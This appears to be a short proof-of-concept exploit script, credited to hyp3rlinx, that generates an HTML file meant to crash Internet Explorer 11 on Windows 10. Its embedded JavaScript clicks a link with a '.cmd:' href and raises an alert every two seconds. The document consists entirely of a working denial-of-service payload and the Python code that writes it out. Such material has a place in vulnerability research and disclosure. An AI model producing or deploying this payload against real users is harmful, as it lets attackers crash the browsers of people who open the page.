payload=('<br>\n'+
'<center>MSIE v11.371.16299 Denial Of Service by hyp3rlinx <br>\n'+
'<a href=".cmd:" id="hate">crashy ware shee</a>\n'+
'<br>\n'+
'Tested successfully on Windows 10\n'+
'</center><script>\n'
'function doit(){\n'+
'document.getElementById("hate").click();\n'+
'alert("DOH!");\n'+
'}\n'+
'setInterval("doit()", 2000)\n'+
'</script>')

file=open("IE-Win10-Crasha.html","w")
file.write(payload)
file.close()

print 'MS InternetExplorer (Win 10) '
print 'Denial Of Service File Created.'
print 'Humayun'
